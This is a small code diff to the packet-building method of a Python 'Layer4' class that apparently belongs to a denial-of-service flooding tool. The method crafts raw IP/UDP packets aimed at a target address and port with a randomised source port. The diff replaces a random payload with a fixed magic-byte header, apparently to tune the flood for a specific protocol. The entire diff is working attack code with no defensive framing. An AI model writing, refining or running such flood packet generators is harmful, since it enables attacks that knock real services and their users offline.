@@ -283,12 +283,15 @@ class Layer4(Thread):
         ip: IP = IP()
         ip.set_ip_src(__ip__)
         ip.set_ip_dst(self._target[0])
+
         udp: UDP = UDP()
         udp.set_uh_sport(ProxyTools.Random.rand_int(32768, 65535))
         udp.set_uh_dport(self._target[1])
-        payload_data = bytes([ProxyTools.Random.rand_int(0, 255) for _ in range(40)])
+
+        payload_data = b"\x13\x37\xca\xfe\x01\x00\x00\x00" + bytes([ProxyTools.Random.rand_int(0, 255) for _ in range(4)])
         udp.contains(Data(payload_data))
         ip.contains(udp)
+
         return ip.get_packet()
 
     def _genrate_syn(self) -> bytes:
